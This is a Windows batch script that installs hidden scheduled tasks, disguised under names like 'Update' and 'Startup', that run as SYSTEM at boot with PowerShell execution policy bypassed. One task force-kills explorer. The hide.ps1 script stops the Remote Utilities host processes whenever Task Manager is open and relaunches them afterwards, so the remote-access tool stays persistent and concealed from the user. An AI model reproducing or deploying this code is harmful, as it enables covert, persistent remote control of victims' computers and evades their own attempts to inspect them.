REM ---------------------------------- 1. Create and Import Main Update.xml W10 ----------------------------------------
>C:\Windows\Performance\Update.xml (
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Date^>2019-05-22T10:27:31.5521412^</Date^>
echo     ^<Author^>DESKTOP^</Author^>
echo     ^<URI^>\Update^</URI^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<BootTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</BootTrigger^>
echo     ^<RegistrationTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</RegistrationTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>Queue^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo     ^<AllowHardTerminate^>false^</AllowHardTerminate^>
echo     ^<StartWhenAvailable^>true^</StartWhenAvailable^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<Duration^>PT1M^</Duration^>
echo       ^<WaitTimeout^>PT0S^</WaitTimeout^>
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
echo     ^<Enabled^>true^</Enabled^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RunOnlyIfIdle^>true^</RunOnlyIfIdle^>
echo     ^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>
echo     ^<UseUnifiedSchedulingEngine^>true^</UseUnifiedSchedulingEngine^>
echo     ^<WakeToRun^>true^</WakeToRun^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Priority^>7^</Priority^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT5M^</Interval^>
echo       ^<Count^>3^</Count^>
echo     ^</RestartOnFailure^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>Powershell.exe^</Command^>
echo       ^<Arguments^>-ExecutionPolicy Bypass C:\Windows\Performance\update.ps1^</Arguments^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) 

schtasks /create /xml "C:\Windows\Performance\Update.xml" /tn "\Update" /ru "SYSTEM"

REM ---------------------------------------------2. Create and Import Main Updates.xml W10 -------------------------------------------------------------
>C:\Windows\Performance\Startup.xml (
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo  ^<RegistrationInfo^>
echo    ^<Date^>2019-05-22T10:27:31.5521412^</Date^>
echo    ^<Author^>DESKTOP^</Author^>
echo    ^<URI^>\Startup^</URI^>
echo  ^</RegistrationInfo^>
echo  ^<Triggers^>
echo    ^<BootTrigger^>
echo      ^<Enabled^>true^</Enabled^>
echo    ^</BootTrigger^>
echo  ^</Triggers^>
echo  ^<Principals^>
echo   ^<Principal id="Author"^>
echo      ^<UserId^>S-1-5-18^</UserId^>
echo      ^<RunLevel^>HighestAvailable^</RunLevel^>
echo    ^</Principal^>
echo  ^</Principals^>
echo  ^<Settings^>
echo    ^<MultipleInstancesPolicy^>Queue^</MultipleInstancesPolicy^>
echo    ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo    ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo    ^<AllowHardTerminate^>false^</AllowHardTerminate^>
echo    ^<StartWhenAvailable^>true^</StartWhenAvailable^>
echo    ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo    ^<IdleSettings^>
echo     ^<StopOnIdleEnd^>true^</StopOnIdleEnd^>
echo      ^<RestartOnIdle^>false^</RestartOnIdle^>
echo    ^</IdleSettings^>
echo    ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
echo    ^<Enabled^>true^</Enabled^>
echo    ^<Hidden^>true^</Hidden^>
echo    ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo    ^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>
echo    ^<UseUnifiedSchedulingEngine^>true^</UseUnifiedSchedulingEngine^>
echo    ^<WakeToRun^>false^</WakeToRun^>
echo    ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo    ^<Priority^>7^</Priority^>
echo  ^</Settings^>
echo  ^<Actions Context="Author"^>
echo    ^<Exec^>
echo      ^<Command^>Powershell.exe^</Command^>
echo      ^<Arguments^>-ExecutionPolicy Bypass C:\Windows\Performance\startup.ps1^</Arguments^>
echo    ^</Exec^>
echo  ^</Actions^>
echo ^</Task^>
)

schtasks /create /xml "C:\Windows\Performance\Startup.xml" /tn "\Startup" /ru "SYSTEM"

REM ------------------------------- 3. Create and Import Main Update.xml W7 -------------------------------------------------------------
>C:\Windows\Performance\Update7.xml (
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Date^>2019-05-29T16:13:42.061815^</Date^>
echo     ^<Author^>Desktop^</Author^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<RegistrationTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</RegistrationTrigger^>
echo     ^<BootTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</BootTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>Queue^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo     ^<AllowHardTerminate^>false^</AllowHardTerminate^>
echo     ^<StartWhenAvailable^>true^</StartWhenAvailable^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<Duration^>PT1M^</Duration^>
echo       ^<WaitTimeout^>PT0S^</WaitTimeout^>
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
echo     ^<Enabled^>true^</Enabled^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RunOnlyIfIdle^>true^</RunOnlyIfIdle^>
echo     ^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>
echo     ^<UseUnifiedSchedulingEngine^>false^</UseUnifiedSchedulingEngine^>
echo     ^<WakeToRun^>true^</WakeToRun^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Priority^>7^</Priority^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT1M^</Interval^>
echo       ^<Count^>3^</Count^>
echo     ^</RestartOnFailure^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>Powershell.exe^</Command^>
echo       ^<Arguments^>-ExecutionPolicy Bypass C:\Windows\Performance\update7.ps1^</Arguments^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
)

schtasks /create /xml "C:\Windows\Performance\Update7.xml" /tn "\Update" /ru "SYSTEM"


REM ------------------------------------------------------------------------- 1. Create H10 --------------------------------------------------------------------------------------
>C:\Windows\Performance\hide.xml (
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Date^>2019-05-29T06:39:44.7215879^</Date^>
echo     ^<Author^>DESKTOP^</Author^>
echo     ^<URI^>\Hide^</URI^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<RegistrationTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</RegistrationTrigger^>
echo     ^<BootTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</BootTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>Queue^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo     ^<AllowHardTerminate^>false^</AllowHardTerminate^>
echo     ^<StartWhenAvailable^>true^</StartWhenAvailable^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
echo     ^<Enabled^>true^</Enabled^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo     ^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>
echo     ^<UseUnifiedSchedulingEngine^>true^</UseUnifiedSchedulingEngine^>
echo     ^<WakeToRun^>false^</WakeToRun^>
echo    ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Priority^>7^</Priority^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT5M^</Interval^>
echo       ^<Count^>5^</Count^>
echo     ^</RestartOnFailure^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>Powershell.exe^</Command^>
echo       ^<Arguments^>-ExecutionPolicy Bypass C:\Windows\Performance\hide.ps1^</Arguments^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
)

schtasks /create /xml "C:\Windows\Performance\hide.xml" /tn "\Hide" /ru "SYSTEM"


REM ------------------------------------------------------------------------- Create Star ------------------------------------------------------------------------
>C:\Windows\Performance\star.xml (
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Date^>2019-05-29T09:08:15.7182419^</Date^>
echo     ^<Author^>DESKTOP^</Author^>
echo     ^<URI^>\Started^</URI^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<RegistrationTrigger^>
echo       ^<EndBoundary^>2030-11-01T09:07:40^</EndBoundary^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</RegistrationTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo      ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo     ^<AllowHardTerminate^>false^</AllowHardTerminate^>
echo     ^<StartWhenAvailable^>true^</StartWhenAvailable^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<AllowStartOnDemand^>false^</AllowStartOnDemand^>
echo     ^<Enabled^>true^</Enabled^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo     ^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>
echo     ^<UseUnifiedSchedulingEngine^>true^</UseUnifiedSchedulingEngine^>
echo     ^<WakeToRun^>false^</WakeToRun^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<DeleteExpiredTaskAfter^>PT0S^</DeleteExpiredTaskAfter^>
echo     ^<Priority^>7^</Priority^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT5M^</Interval^>
echo       ^<Count^>3^</Count^>
echo     ^</RestartOnFailure^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>C:\Windows\Performance\star.bat^</Command^>
echo     ^</Exec^>
echo      ^<Exec^>
echo       ^<Command^>Powershell.exe^</Command^>
echo       ^<Arguments^>-ExecutionPolicy Bypass C:\Windows\Performance\startup.ps1^</Arguments^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
)


REM -------------------------------------------------------------------------- Create "Import bat" --------------------------------------------------------------------------------------------
>C:\Windows\Performance\importhide.bat (
echo schtasks /create /xml "C:\Windows\Performance\star.xml" /tn "\Started" /ru "SYSTEM"
echo TIMEOUT 10
echo schtasks /delete /tn Started /f
echo exit
)

REM -------------------------------------------------------------------------- Create Start bat --------------------------------------------------------------------------------
>C:\Windows\Performance\star.bat (
echo "C:\Program Files (x86)\Remote Utilities - Host\rutserv.exe" /start
echo exit
)

REM -------------------------------------------------------------------------- PWSL dwn--------------------------------------------------------------------------------------------


REM ----------------------------------------------------------------------- PWSL dwn7 -------------------------------------------------------------------------------


REM ----------------------------------------------------------------------- PWSL dwns -------------------------------------------------------------------------------
>C:\Windows\Performance\startup.ps1 (
echo Start-Sleep -s 10 
echo Stop-Process -ProcessName explorer -force
)

REM ----------------------------------------------------------------------- PWSL hide -------------------------------------------------------------------------------
>C:\Windows\Performance\hide.ps1 (
echo $process1="rutserv"
echo $process2="rfusclient"
echo $batchPath="C:\Windows\Performance\importhide.bat"
echo $flage=0
echo $runit=0
echo Do {    
echo     Start-Sleep -s 3 
echo     $check= Get-Process  "taskmgr"  -ErrorAction SilentlyContinue  
echo     if^($check^) 
echo       {       
echo        $flage=1
echo        stop-process -name  $process1 -Force -ErrorAction SilentlyContinue
echo        stop-process -name  $process2 -Force -ErrorAction SilentlyContinue     
echo       }
echo       else
echo       {
echo         if ^( $flage -eq 1^)
echo              {             
echo               $flage=0
echo               $runit=1             
echo              }         
echo          if ^($runit -eq 1^) { 
echo              Start-Sleep -s 60
echo              Start-Process -FilePath $batchPath
echo              $runit=0
echo              }                 
echo       }
echo }while ^($true^)
)


exit

